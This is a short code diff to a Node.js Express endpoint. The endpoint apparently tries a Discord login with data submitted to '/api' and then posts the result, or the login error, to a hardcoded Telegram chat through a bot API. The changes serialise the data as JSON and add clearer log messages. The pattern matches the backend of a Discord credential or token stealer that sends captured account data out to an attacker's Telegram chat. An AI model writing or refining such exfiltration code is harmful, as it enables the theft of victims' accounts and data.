@@ -49,41 +49,42 @@ app.post("/api", (req, res) => {
     .then((data) => {
       // Успешно!
       console.log(data);
+      const messageText = JSON.stringify(data);
 
       try {
         axios
           .post(apiUrl, {
             chat_id: "6425112328",
-            text: `${data}`,
+            text: messageText,
           })
           .then((response) => {
-            console.log("successfully");
+            console.log("successfully sent to Telegram");
           })
           .catch((error) => {
-            console.error("Error");
+            console.error("Error sending to Telegram:", error);
           });
       } catch (error) {
-        console.error("error tg send");
+        console.error("error tg send:", error);
       }
     })
     .catch((error) => {
       // Ошибка!
-      console.error(error);
+      console.error("Error logging in to Discord:", error);
 
       try {
         axios
           .post(apiUrl, {
             chat_id: "6425112328",
-            text: `${error}`,
+            text: `Error logging in to Discord: ${error.message}`,
           })
           .then((response) => {
-            console.log("successfully");
+            console.log("successfully sent error to Telegram");
           })
           .catch((error) => {
-            console.error("Error");
+            console.error("Error sending error to Telegram:", error);
           });
       } catch (error) {
-        console.error("error tg send");
+        console.error("error tg send:", error);
       }
     });
 
